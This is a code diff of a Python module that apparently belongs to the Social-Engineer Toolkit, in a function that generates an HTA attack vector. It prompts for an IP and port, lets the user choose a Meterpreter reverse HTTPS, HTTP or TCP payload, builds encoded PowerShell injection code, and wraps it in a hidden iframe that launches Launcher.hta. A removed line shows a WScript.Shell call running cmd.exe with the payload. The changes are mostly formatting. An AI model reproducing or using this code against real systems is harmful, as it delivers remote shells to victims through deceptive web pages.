@@ -7,13 +7,11 @@
 from src.core.setcore import *
 
 def gen_hta_cool_stuff():
-    print_status(
-        "HTA Attack Vector selected. Enter your IP, Port, and Payload...")
+    print_status("HTA Attack Vector selected. Enter your IP, Port, and Payload...")
     ipaddr = grab_ipaddress()
     update_options("IPADDR=%s" % (ipaddr))
     port = input("Enter the port for the reverse payload [443]: ")
-    if port == "":
-        port = "443"
+    if port == "": port = "443"
     print("""Select the payload you want to deliver:\n\n  1. Meterpreter Reverse HTTPS\n  2. Meterpreter Reverse HTTP\n  3. Meterpreter Reverse TCP\n""")
     selection = input("Enter the payload number [1-3]: ")
 
@@ -24,8 +22,7 @@ def gen_hta_cool_stuff():
     if selection == "3": selection = "windows/meterpreter/reverse_tcp"
 
     # generate powershell code
-    print_status(
-        "Generating powershell injection code and x86 downgrade attack...")
+    print_status("Generating powershell injection code and x86 downgrade attack...")
     ps = generate_powershell_alphanumeric_payload(selection, ipaddr, port, "x86")
     command = (powershell_encodedcommand(ps))
 
@@ -57,9 +54,6 @@ def gen_hta_cool_stuff():
     main3 = ("""' + {0} + """.format(cmd_split4))
     main4 = ("""' /c {0}', 0);window.close();\n</script>""".format(command))
     html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\n<script type="text/javascript">setTimeout(function(){window.location.href="%s";}, 15000);</script>""" % url)
-
-    #main1 = ("""<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);window.close();\n</script>""" % (command))
-    #main2 = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\n<script type="text/javascript">setTimeout(function(){window.location.href="%s";}, 15000);</script>""" % url)
 
     # metasploit answer file here
     filewrite = open(setdir + "/meta_config", "w")
